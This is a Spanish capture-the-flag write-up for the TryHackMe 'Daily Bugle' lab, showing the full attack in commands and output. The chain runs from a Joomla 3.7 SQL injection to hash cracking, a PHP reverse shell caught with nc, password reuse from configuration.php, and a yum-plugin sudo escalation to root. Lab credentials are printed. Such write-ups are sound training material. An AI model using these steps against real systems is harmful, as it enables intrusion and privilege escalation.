# Daily Bugle

![image](https://github.com/JoseVazquez101/Writteups/assets/111292579/682e0484-03da-44d6-85ec-26971c4c2168)

***
- Source: https://tryhackme.com/room/dailybugle
- OS: Linux
- Dificultad: Hard
- IP: No estática
- Temas: ``CMS``, ``Joomla``, `Sqli`, `Linux PrivEsc`.
***

~~~bash
┌──(kali💀Dedsec)-[~/Maquinas/Linux/Dayly_Bugle]
└─$ sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn -sV 10.10.19.253
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.94 ( https://nmap.org ) at 2024-02-16 19:34 EST
NSE: Loaded 46 scripts for scanning.
Initiating SYN Stealth Scan at 19:34
Scanning 10.10.19.253 [65535 ports]
Discovered open port 3306/tcp on 10.10.19.253
Discovered open port 22/tcp on 10.10.19.253
Discovered open port 80/tcp on 10.10.19.253
Completed SYN Stealth Scan at 19:35, 24.95s elapsed (65535 total ports)
Initiating Service scan at 19:35
Scanning 3 services on 10.10.19.253
Completed Service scan at 19:35, 11.83s elapsed (3 services on 1 host)
NSE: Script scanning 10.10.19.253.
NSE: Starting runlevel 1 (of 2) scan.
Initiating NSE at 19:35
Completed NSE at 19:35, 1.03s elapsed
NSE: Starting runlevel 2 (of 2) scan.
Initiating NSE at 19:35
Completed NSE at 19:35, 1.18s elapsed
Nmap scan report for 10.10.19.253
Host is up, received user-set (0.51s latency).
Scanned at 2024-02-16 19:35:00 EST for 39s
Not shown: 39102 filtered tcp ports (no-response), 26430 closed tcp ports (reset)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT     STATE SERVICE REASON         VERSION
22/tcp   open  ssh     syn-ack ttl 61 OpenSSH 7.4 (protocol 2.0)
80/tcp   open  http    syn-ack ttl 61 Apache httpd 2.4.6 ((CentOS) PHP/5.6.40)
3306/tcp open  mysql   syn-ack ttl 61 MariaDB (unauthorized)

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 39.37 seconds
           Raw packets sent: 121003 (5.324MB) | Rcvd: 27783 (1.111MB)

~~~

- Si vamos a la ruta `http://10.10.19.253/administrator/manifests/files/joomla.xml` podemos ver algunas rutas:

~~~xml
<fileset>
<files>
<folder>administrator</folder>
<folder>bin</folder>
<folder>cache</folder>
<folder>cli</folder>
<folder>components</folder>
<folder>images</folder>
<folder>includes</folder>
<folder>language</folder>
<folder>layouts</folder>
<folder>libraries</folder>
<folder>media</folder>
<folder>modules</folder>
<folder>plugins</folder>
<folder>templates</folder>
<folder>tmp</folder>
<file>htaccess.txt</file>
<file>web.config.txt</file>
<file>LICENSE.txt</file>
<file>README.txt</file>
<file>index.php</file>
</files>
</fileset>
~~~

- Por ahora enumeraremos solo la versión, pues no hay nada interesante más allá del login de administrador.
- Podemos encontrarla en `http://10.10.19.253/language/en-GB/en-GB.xml`:

~~~xml
<metafile version="3.7" client="site">
<name>English (en-GB)</name>
<version>3.7.0</version>
<creationDate>April 2017</creationDate>
<author>Joomla! Project</author>
<authorEmail>admin@joomla.org</authorEmail>
<authorUrl>www.joomla.org</authorUrl>
<copyright>
Copyright (C) 2005 - 2017 Open Source Matters. All rights reserved.
</copyright>
<license>
GNU General Public License version 2 or later; see LICENSE.txt
</license>
<description>en-GB site language</description>
<metadata>
<name>English (en-GB)</name>
<nativeName>English (United Kingdom)</nativeName>
<tag>en-GB</tag>
<rtl>0</rtl>
<locale>
en_GB.utf8, en_GB.UTF-8, en_GB, eng_GB, en, english, english-uk, uk, gbr, britain, england, great britain, uk, united kingdom, united-kingdom
</locale>
<firstDay>0</firstDay>
<weekEnd>0,6</weekEnd>
<calendar>gregorian</calendar>
</metadata>
<params/>
</metafile>
~~~


- Si filtramos por la versión en `searchsploit` podemos ver un exploit que sin duda luce prometedor:

~~~bash 
┌──(kali💀Dedsec)-[~/Maquinas/Linux/Dayly_Bugle]
└─$ searchsploit joomla 3.7
------------------------------------------- ---------------------------------
 Exploit Title                             |  Path
------------------------------------------- ---------------------------------
Joomla! 3.7 - SQL Injection                | php/remote/44227.php
~~~

- El exploit nos dice que es posible realizar una inyección a la base de datos a través de la url `http://10.10.19.253/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=1`
- Donde se nos permitirá añadir parámetros para obtener información de usuarios.
- La máquina nos invita a hacer el ataque con un exploit de ython, busqué y encontré este: https://github.com/stefanlucas/Exploit-Joomla/blob/master/joomblah.py
- Ahora bien, nos arroja un hash que podemos romper:

~~~bash
┌──(kali💀Dedsec)-[~/Maquinas/Linux/Dayly_Bugle]
└─$ python3 joomblah.py http://10.10.19.253
                                                                                                                    
    .---.    .-'''-.        .-'''-.                                                           
    |   |   '   _    \     '   _    \                            .---.                        
    '---' /   /` '.   \  /   /` '.   \  __  __   ___   /|        |   |            .           
    .---..   |     \  ' .   |     \  ' |  |/  `.'   `. ||        |   |          .'|           
    |   ||   '      |  '|   '      |  '|   .-.  .-.   '||        |   |         <  |           
    |   |\    \     / / \    \     / / |  |  |  |  |  |||  __    |   |    __    | |           
    |   | `.   ` ..' /   `.   ` ..' /  |  |  |  |  |  |||/'__ '. |   | .:--.'.  | | .'''-.    
    |   |    '-...-'`       '-...-'`   |  |  |  |  |  ||:/`  '. '|   |/ |   \ | | |/.'''. \   
    |   |                              |  |  |  |  |  |||     | ||   |`" __ | | |  /    | |   
    |   |                              |__|  |__|  |__|||\    / '|   | .'.''| | | |     | |   
 __.'   '                                              |/'..' / '---'/ /   | |_| |     | |   
|      '                                               '  `'-'`       \ \._,\ '/| '.    | '.  
|____.'                                                                `--'  `" '---'   '---' 

 [-] Fetching CSRF token
 [-] Testing SQLi
  -  Found table: fb9j5_users
  -  Extracting users from fb9j5_users
 [$] Found user ['811', 'Super User', 'jonah', 'jonah@tryhackme.com', '$2y$10$0veO/JSFh4389Lluc4Xya.dfy2MF.bZhz0jVMw.V.d3p12kBtZutm', '', '']
  -  Extracting sessions from fb9j5_session
~~~

- Lo guardamos y utilizamos ``john``, tardará aproximadamente 5 minutos:

~~~bash
┌──(kali💀Dedsec)-[~/Maquinas/Linux/Dayly_Bugle]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt hash                         
Using default input encoding: UTF-8
Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
Cost 1 (iteration count) is 1024 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
spiderman123     (jonah)     
1g 0:00:06:05 DONE (2024-02-16 22:01) 0.002737g/s 128.2p/s 128.2c/s 128.2C/s tiffany3..spider123
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
~~~

- Iniciamos sesión y nos dirigimos a `Templates ---> error.php`

![image](https://github.com/JoseVazquez101/Writteups/assets/111292579/22b9a417-5d00-46b3-a508-5eda7de69214)

- Añadimos una revshell ejecutada en php:

![image](https://github.com/JoseVazquez101/Writteups/assets/111292579/ad109800-6157-4bfb-a833-9fa804df84af)


- Ahora solo debemos visitar `http://10.10.19.253/index.php/<>` y deberíamos entablar una conexión:

~~~bash
┌──(kali💀Dedsec)-[~/Maquinas/Linux/Dayly_Bugle]
└─$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.2.60.167] from (UNKNOWN) [10.10.19.253] 41870
bash: no job control in this shell
bash-4.2$ id
id
uid=48(apache) gid=48(apache) groups=48(apache)
~~~

- Realizamos un tratamiento de TTY:

~~~bash
script /dev/null -c bash
^Z
stty raw -echo; fg
reset xterm
export TERM=xterm
export SHELL=bash
stty rows 44 columns 184
~~~

***
### PrivEsc:

- Primero que nada, enumeré dos usuarios (`root`, `jjameson`) a los cuales podemos escalar:

~~~bash
bash-4.2$ cat /etc/passwd | grep bash
root:x:0:0:root:/root:/bin/bash
jjameson:x:1000:1000:Jonah Jameson:/home/jjameson:/bin/bash
~~~

- Vemos que tenemos un archivo de configuración, como es común en los CMS:

~~~bash
bash-4.2$ ls -la
total 64
drwxr-xr-x. 17 apache apache  4096 Dec 14  2019 .
drwxr-xr-x.  4 root   root      33 Dec 14  2019 ..
-rwxr-xr-x.  1 apache apache 18092 Apr 25  2017 LICENSE.txt
-rwxr-xr-x.  1 apache apache  4494 Apr 25  2017 README.txt
drwxr-xr-x. 11 apache apache   159 Apr 25  2017 administrator
drwxr-xr-x.  2 apache apache    44 Apr 25  2017 bin
drwxr-xr-x.  2 apache apache    24 Apr 25  2017 cache
drwxr-xr-x.  2 apache apache   119 Apr 25  2017 cli
drwxr-xr-x. 19 apache apache  4096 Apr 25  2017 components
-rw-r--r--   1 apache apache  1982 Dec 14  2019 configuration.php
-rwxr-xr-x.  1 apache apache  3005 Apr 25  2017 htaccess.txt
drwxr-xr-x.  5 apache apache   164 Dec 15  2019 images
drwxr-xr-x.  2 apache apache    64 Apr 25  2017 includes
-rwxr-xr-x.  1 apache apache  1420 Apr 25  2017 index.php
drwxr-xr-x.  4 apache apache    54 Apr 25  2017 language
drwxr-xr-x.  5 apache apache    70 Apr 25  2017 layouts
drwxr-xr-x. 11 apache apache   255 Apr 25  2017 libraries
drwxr-xr-x. 26 apache apache  4096 Apr 25  2017 media
drwxr-xr-x. 27 apache apache  4096 Apr 25  2017 modules
drwxr-xr-x. 16 apache apache   250 Apr 25  2017 plugins
-rwxr-xr-x.  1 apache apache   836 Apr 25  2017 robots.txt
drwxr-xr-x.  5 apache apache    68 Dec 15  2019 templates
drwxr-xr-x.  2 apache apache    24 Dec 15  2019 tmp
-rwxr-xr-x.  1 apache apache  1690 Apr 25  2017 web.config.txt
~~~

- Si lo vemos, nos dará una contraseña para la base de datos:

~~~php
        public $dbtype = 'mysqli';
        public $host = 'localhost';
        public $user = 'root';
        public $password = 'nv5uz9r3ZEDzVjNu';
~~~

- Intenté enumerar la base de datos de `mysql` como root, pero no encontré nada.
- Podemos agradecer a la reutilización de contraseñas, ya que es la contraseña para `jjameson`:

~~~bash
bash-4.2$ su jjameson
Password: 
[jjameson@dailybugle html]$ id
uid=1000(jjameson) gid=1000(jjameson) groups=1000(jjameson)
~~~

- Podemos ejecutar `yum` como sudo:

~~~bash
[jjameson@dailybugle ~]$ sudo -l
Matching Defaults entries for jjameson on dailybugle:
    !visiblepw, always_set_home, match_group_by_gid, always_query_group_plugin, env_reset, env_keep="COLORS DISPLAY HOSTNAME HISTSIZE KDEDIR LS_COLORS", env_keep+="MAIL PS1 PS2 QTDIR
    USERNAME LANG LC_ADDRESS LC_CTYPE", env_keep+="LC_COLLATE LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES", env_keep+="LC_MONETARY LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE",
    env_keep+="LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY", secure_path=/sbin\:/bin\:/usr/sbin\:/usr/bin

User jjameson may run the following commands on dailybugle:
    (ALL) NOPASSWD: /usr/bin/yum
~~~

- En ese caso, solo bastará con seguir usa serie de pasos, que nos permitirán obtener acceso de root utilizando una técnica de manipulación de plugins en ``Yum``, aprovechando la ejecución de comandos con permisos de sudo.

- Creamos un directorio temporal:
~~~bash
[jjameson@dailybugle ~]$ TF=$(mktemp -d)
[jjameson@dailybugle ~]$ ls /tmp
tmp.sn7HDF6jyP
[jjameson@dailybugle ~]$ cd /tmp/tmp.sn7HDF6jyP/
[jjameson@dailybugle tmp.sn7HDF6jyP]$ 
~~~

- Creamos un archivo de configuración `x` que instruye a `Yum` a habilitar plugins y especifica el directorio temporal como la ubicación para buscar estos plugins y sus configuraciones.
- Este archivo modifica temporalmente el comportamiento de `Yum`, permitiendo la carga de plugins desde el directorio creado.

~~~bash
[jjameson@dailybugle tmp.sn7HDF6jyP]$ cat >$TF/x<<EOF
> [main]
> plugins=1
> pluginpath=$TF
> pluginconfpath=$TF
> EOF
[jjameson@dailybugle tmp.sn7HDF6jyP]$ 
~~~

- Creamos un segundo archivo `y.conf` para el plugin malicioso, habilitando el plugin a través de esta configuración.
- Este paso es crucial para asegurar que `Yum` reconozca y active el plugin:

~~~bash
[jjameson@dailybugle tmp.sn7HDF6jyP]$ cat >$TF/y.conf<<EOF
> [main]
> enabled=1
> EOF
~~~

- Creamos un archivo de Python, donde cargaremos nuestras instrucciones para spawnear nuestra shell en cuanto yum habilite el plugin:

~~~bash
[jjameson@dailybugle tmp.sn7HDF6jyP]$ cat >$TF/y.py<<EOF
> import os
> import yum
> from yum.plugins import PluginYumExit, TYPE_CORE, TYPE_INTERACTIVE
> requires_api_version='2.1'
> def init_hook(conduit):
>   os.execl('/bin/sh','/bin/sh')
> EOF
~~~

- Ejecutamos la habilitación de nuestro plugin `y`, que según el script de Python nos saltará a nuestra bash como `root`:

~~~bash
[jjameson@dailybugle tmp.sn7HDF6jyP]$ sudo yum -c $TF/x --enableplugin=y
Loaded plugins: y
No plugin match for: y
sh-4.2# id
uid=0(root) gid=0(root) groups=0(root)
~~~

- Y así hemos rooteado esta máquina, en realidad le pondría una dificultad entre Easy/Medium, pero viene bien para repasar y practicar algunas técnicas.

